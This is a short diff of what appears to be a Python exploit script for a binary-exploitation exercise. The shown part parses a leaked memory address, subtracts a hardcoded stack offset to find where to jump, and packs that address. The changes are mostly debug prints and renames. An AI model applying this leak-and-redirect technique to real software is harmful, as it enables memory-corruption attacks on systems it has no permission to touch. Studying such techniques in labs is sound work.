@@ -43,15 +43,23 @@ r.read(120)
 leaked_address =  r.read(6) + b"\x00\x00"
 addr = u64(leaked_address)
 swapped = addr.to_bytes(8, byteorder='big')
-print(leaked_address)
-print(swapped)
-print(addr)
+print("leaked add %#x" %addr)
+
+print("converted leaked %#d" %addr)
+# addr = u64(swapped)
+# print("converted swapped %#d" %addr)
+# print("swapped add %#x" %addr)
 
 myAddr = 140737350114704  #leaked in locale
 mybuff = 140737488346738  #start of buffer in locale
-offset = myAddr - mybuff
+stackOffset = myAddr - mybuff
 
-whereToJump = addr-offset
+# programOff = myAddr - addr
+# trueOff = stackOffset + programOff
+#print(trueOff)
+
+whereToJump = addr-stackOffset
+print("Where to jump %#x" %whereToJump)
 wtj = whereToJump.to_bytes(8, byteorder='little')
 
 
